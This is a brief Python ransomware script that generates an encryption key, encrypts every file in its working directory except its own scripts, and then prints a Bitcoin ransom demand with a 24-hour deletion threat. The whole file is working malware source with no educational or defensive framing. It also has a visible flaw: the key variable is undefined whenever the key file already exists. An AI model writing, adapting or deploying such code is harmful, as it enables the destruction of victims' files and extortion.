#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

# Check if the key file exists
if not os.path.exists("thekey.key"):
    # Generate a new key and store it in the key file
    key = Fernet.generate_key()
    with open("thekey.key", "wb") as thekey:
        thekey.write(key)
    print("Key file created successfully.")

# List all files except the script files (voldemort.py, decrypt.py)
files = []
for file in os.listdir():
    if file == "voldemort.py" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

# Check if any files were found
if not files:
    print("No files to encrypt.")
    exit()

print("Found the following files:")
for file in files:
    print(file)

# Encrypt all files using the key
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()

    try:
        # Encrypt the file contents
        contents_encrypted = Fernet(key).encrypt(contents)
    except Exception as e:
        print(f"Error encrypting {file}: {e}")
        continue

    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

# Notify the user of the encryption and the ransom demand
print("All of your files have been encrypted!")
print("Send me 0.0238 BTC to [wallet address] to get the decryption key.")
print("If you don't pay in 24 hours, your files will be deleted permanently.")
  
